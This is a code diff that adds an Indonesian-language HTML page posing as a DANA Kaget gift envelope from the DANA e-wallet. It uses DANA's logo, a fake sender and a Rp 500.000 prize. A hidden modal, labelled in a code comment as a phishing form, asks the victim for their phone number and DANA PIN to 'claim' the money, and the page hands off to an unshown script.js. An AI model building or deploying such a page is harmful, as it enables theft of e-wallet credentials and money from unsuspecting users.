@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kamu Dapat DANA Kaget!</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://assets.dana.id/favicon.ico">
+</head>
+<body>
+
+    <div class="container">
+        <div class="card-daget">
+            <div class="header">
+                <img src="https://i.ibb.co/L8C40S7/dana-kaget.png" alt="DANA Kaget" class="daget-icon">
+                <p>Kamu dapat DANA Kaget!</p>
+            </div>
+            <div class="sender-info">
+                <img src="https://i.ibb.co/qYfK3x4/profile.jpg" alt="Pengirim" class="profile-pic">
+                <p class="sender-name" id="fakeSender">Orang Baik Hati</p>
+                <p class="message">"Rezeki buat kamu, semoga berkah ya!"</p>
+            </div>
+            <div class="envelope">
+                <img src="https://i.ibb.co/Q8Q93Y5/amplop.png" alt="Amplop DANA" class="amplop-img">
+            </div>
+            <button id="openButton">Buka Amplop Sekarang</button>
+        </div>
+    </div>
+
+    <!-- Modal Form Phising, disembunyiin dulu, anjing -->
+    <div id="phishingModal" class="modal-backdrop" style="display: none;">
+        <div class="modal-content">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Logo_dana_blue.svg/2560px-Logo_dana_blue.svg.png" alt="DANA Logo" class="modal-logo">
+            <h2>SELAMAT!</h2>
+            <p>Kamu mendapatkan DANA Kaget sebesar <strong id="fakeAmount">Rp 500.000</strong>!</p>
+            <p class="sub-text">Masukkan nomor DANA untuk klaim.</p>
+            <form id="phishing-form">
+                <input type="tel" id="nomorHP" placeholder="08xx-xxxx-xxxx" required>
+                <input type="password" id="pin" placeholder="Masukkan PIN DANA" required>
+                <button type="submit" id="claimButton">KLAIM SEKARANG</button>
+            </form>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
